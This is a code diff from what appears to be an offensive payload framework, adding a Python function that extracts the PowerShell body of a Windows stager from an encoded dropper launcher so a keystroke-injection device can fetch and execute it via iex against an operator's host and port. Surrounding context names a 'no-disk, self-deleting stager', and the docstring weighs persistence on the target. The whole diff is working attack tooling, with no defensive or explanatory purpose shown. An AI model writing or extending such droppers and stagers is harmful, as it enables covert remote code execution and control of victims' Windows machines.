@@ -1057,6 +1057,31 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
     return ""
 
 
+def windows_stager_script(host: str, port: int, use_ssl: bool = True) -> str:
+    """The PowerShell BODY of the Windows stager, as text.
+
+    `generate_dropper` hands the operator a LAUNCHER
+    (``powershell ... -Enc <base64>``). A short HID stager needs the script
+    itself, so it can ``iex`` what it fetched. Decoding it back out of the
+    SAME ``generate_dropper`` call the inline path uses is what makes the
+    served script and the typed one the same bytes instead of two copies
+    that drift apart.
+
+    ``resilient=False`` ON PURPOSE: the short command already retries in a
+    client-side loop, and the resilient wrapper would additionally schedule
+    its own retry task — a second, unrequested persistence on the target.
+    """
+    drop = generate_dropper("windows", host, port, arch="x64",
+                            dl_port=port, use_ssl=use_ssl, resilient=False)
+    if " -Enc " not in drop:
+        return ""
+    encoded = drop.rsplit(" -Enc ", 1)[1].strip()
+    try:
+        return base64.b64decode(encoded).decode("utf-16-le")
+    except Exception:
+        return ""
+
+
 def generate_stealth_dropper(platform: str, lhost: str, lport: int,
                              dl_port: int = None, use_ssl: bool = True) -> str:
     """No-disk, self-deleting stager.
